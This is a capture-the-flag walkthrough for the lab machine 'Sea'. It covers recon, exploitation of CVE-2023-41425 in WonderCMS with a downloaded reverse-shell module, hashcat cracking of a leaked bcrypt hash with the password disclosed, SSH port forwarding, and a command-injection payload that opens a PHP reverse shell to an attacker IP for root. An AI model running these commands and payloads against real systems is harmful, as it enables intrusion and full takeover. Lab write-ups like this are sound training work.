# Sea: Machine Notes

## Recon

### Nmap
```bash
nmap -sV -sC -vv -p- 10.129.53.69 -T4
```
**Results:**
- 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
  - Title: Sea - Home

### Directory Enumeration
```bash
gobuster dir -u http://10.129.53.69/ -w /usr/share/wordlists/dirb/big.txt -t 50
gobuster dir -u http://10.129.53.69/themes/ -w /usr/share/wordlists/dirb/big.txt -t 50
gobuster dir -u http://10.129.53.69/themes/bike/ -w /usr/share/wordlists/dirb/big.txt -t 50
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://sea.htb/themes/bike/FUZZ" -t 200 -fc 403
```
**Findings:**
- WonderCMS bike theme
- Version: 3.2.0

## Exploitation

### CVE-2023-41425 (WonderCMS RCE)
1. Download malicious module:
```bash
wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
```
2. Modify `exploit.py` to point to local server (e.g., `http://10.10.15.244:8000/main.zip`).
3. Execution:
```bash
nc -lnvp 4444
python3 exploit.py "http://sea.htb/index.php?page=LoginURL" 10.10.15.244 4444
```

### Initial Foothold / Password Cracking
- Database file: `/var/www/sea/data/database.js`
- Hash: `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q`
- Cracking:
```bash
echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- Result: `mychemicalromance`
- Users: `amay`, `geo`
- SSH: `ssh amay@sea.htb` (Password: `mychemicalromance`)

## Privilege Escalation

### Local Port Forwarding
- Port 8080 is internal.
```bash
ssh -L 0.0.0.0:8000:localhost:8080 amay@sea.htb
```
- Access internal service via Kali at `http://sea.htb:8000/`.

### RCE via Internal Monitoring (Log Analysis)
Service vulnerable to command injection in the `log_file` parameter.
Payload (requires URL encoding for Burp):
```http
POST / HTTP/1.1
...
log_file=;php+-r+'$sock%3dfsockopen("10.10.15.244",4444)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'&analyze_log=
```
- **Crucial tip**: Start with `;` to break the command.
- Result: Root shell.
